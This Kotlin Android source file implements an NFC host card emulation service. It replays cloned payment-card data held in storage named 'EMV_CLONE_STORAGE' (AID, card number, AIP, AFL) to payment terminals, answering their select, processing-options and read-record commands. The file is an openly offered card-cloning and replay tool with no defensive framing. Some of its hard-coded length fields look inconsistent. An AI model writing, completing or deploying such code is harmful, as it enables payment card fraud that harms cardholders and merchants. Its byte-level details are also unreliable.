package com.example.cardscanner

import android.content.Context
import android.nfc.cardemulation.HostApduService
import android.os.Bundle
import android.util.Log

class MyCardEmulatorService : HostApduService() {

    override fun processCommandApdu(commandApdu: ByteArray?, extras: Bundle?): ByteArray {
        if (commandApdu == null) return hexStringToByteArray("6F00")
        val incomingHex = bytesToHex(commandApdu)

        val prefs = getSharedPreferences("EMV_CLONE_STORAGE", Context.MODE_PRIVATE)
        val savedAid = prefs.getString("HEX_AID", "A0000000041010") ?: "A0000000041010"
        val savedPan = prefs.getString("TAG_5A", "") ?: ""
        val savedAfl = prefs.getString("TAG_94", "08010100") ?: "08010100"
        val savedAip = prefs.getString("TAG_82", "0080") ?: "0080"

        if (incomingHex.startsWith("00A40400")) {
            Log.i("SOFTPOS_BRIDGE", "Select AID Handshake: $savedAid")
            val fciPayload = "6F1C8407" + savedAid + "A511500A4D4153544552434152449F38039F37049000"
            return hexStringToByteArray(fciPayload)
        }

        if (incomingHex.startsWith("80A80000")) {
            val gpoPayload = "770E8202" + savedAip + "9408" + savedAfl + "9000"
            return hexStringToByteArray(gpoPayload)
        }

        if (incomingHex.startsWith("00B2")) {
            val recordPayload = "70145A08" + savedPan.padEnd(16, '0') + "9F24032912319000"
            return hexStringToByteArray(recordPayload)
        }

        return hexStringToByteArray("9000")
    }

    override fun onDeactivated(reason: Int) {
        Log.w("SOFTPOS_BRIDGE", "NFC Link Drop: $reason")
    }

    private fun hexStringToByteArray(s: String): ByteArray {
        val len = s.length
        val data = ByteArray(len / 2)
        var i = 0
        while (i < len) {
            data[i / 2] = ((Character.digit(s[i], 16) shl 4) + Character.digit(s[i + 1], 16)).toByte()
            i += 2
        }
        return data
    }

    private fun bytesToHex(bytes: ByteArray): String {
        return bytes.joinToString("") { String.format("%02X", it) }
    }
}
